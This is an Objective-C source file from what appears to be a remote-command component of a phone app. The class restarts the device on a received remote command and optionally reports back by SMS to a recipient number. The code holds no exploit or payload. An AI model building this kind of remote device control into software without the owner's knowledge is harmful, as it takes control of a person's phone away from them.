/**
 - Project name :  RemoteCommandMager Component
 - Class name   :  RestartDeviceProcessor
 - Version      :  1.0  
 - Purpose      :  For RemoteCommandMager Component
 - Copy right   :  24/11/2011, Prasad M.B, Vervata Co., Ltd. All rights reserved.
*/

#import "RestartDeviceProcessor.h"
#import "SystemUtils.h"

@interface RestartDeviceProcessor (PrivateAPI)
- (void) sendReplySMS;
- (void) processRestartDevice;
@end

@implementation RestartDeviceProcessor

/**
 - Method name: initWithRemoteCommandData
 - Purpose:This method is used to initialize the RestartDeviceProcessor class
 - Argument list and description: aRemoteCmdData (RemoteCmdData)
 - Return description: self (RestartDeviceProcessor)
*/

- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData  {
    DLog (@"RestartDeviceProcessor--->initWithRemoteCommandData");
	if ((self =  [super initWithRemoteCommandData:aRemoteCmdData])) {
	}
	return self;
}

#pragma mark RemoteCmdProcessor Methods

/**
 - Method name: doProcessingCommand
 - Purpose:This method is used to process the RestartDeviceProcessor
 - Argument list and description:No Argument 
 - Return description: No return type
*/

- (void) doProcessingCommand {
	 DLog (@"RestartDeviceProcessor--->doProcessingCommand")
	[self processRestartDevice];
}


#pragma mark RestartDeviceProcessor

/**
 - Method name: processRestartDevice
 - Purpose:This method is used to Restart Devoce
 - Argument list and description: No Return Type
 - Return description: mRemoteCmdCode (NSString *)
*/

- (void) processRestartDevice {
	DLog (@"RestartDeviceProcessor--->processRestartDevice")
	id <SystemUtils> utils=[[RemoteCmdUtils sharedRemoteCmdUtils] mSystemUtils];
	[self sendReplySMS];
	[NSThread sleepForTimeInterval:10.0];
	[utils restartDevice];
}

/**
 - Method name: sendReplySMS
 - Purpose:This method is used to send the SMS reply
 - Argument list and description: aStatusCode (NSUInteger)
 - Return description: No return type
*/

- (void) sendReplySMS {
	DLog (@"RestartDeviceProcessor--->sendReplySMS")
	NSString *restartDeviceMessage=[[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																				      andErrorCode:_SUCCESS_];
	[[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:mRemoteCmdData
											 andReplyMessage:restartDeviceMessage];
	if ([mRemoteCmdData mIsSMSReplyRequired]) {
		[[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber]
														       andMessage:restartDeviceMessage];
	}
	
}

/*
 - Method name:dealloc
 - Purpose: This is memory mangement method. Invoked when the class object releasd.
 - Argument list and description: No argument
 - Return type and description: No Return
*/


-(void) dealloc {
	[super dealloc];
}


@end
